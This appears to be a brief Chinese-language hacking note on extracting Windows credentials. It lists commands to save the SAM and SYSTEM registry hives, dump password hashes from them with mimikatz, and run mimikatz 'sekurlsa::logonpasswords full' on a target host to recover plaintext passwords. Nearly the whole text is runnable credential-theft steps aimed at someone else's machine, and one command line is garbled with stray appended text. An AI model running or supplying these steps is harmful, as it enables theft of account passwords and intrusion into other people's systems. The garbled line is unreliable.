
获取明文密码

Windows Server 2003、Windows Server 2008、Windows 7 都能直接获取到明文密码

首先我们需要把当前系统注册表 SAM、SYSTEM 获取到
reg save HKLM\SYSTEM Sys.hiv

reg save HKLM\SAM Sam.hiv

mimikatz "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" exitsaulGoodman


然后把这两个文件拖回本地然后用 mimikatz 抓取密码hash


mimikatz "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" exit

把mimikatz拖到目标主机获取密码

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
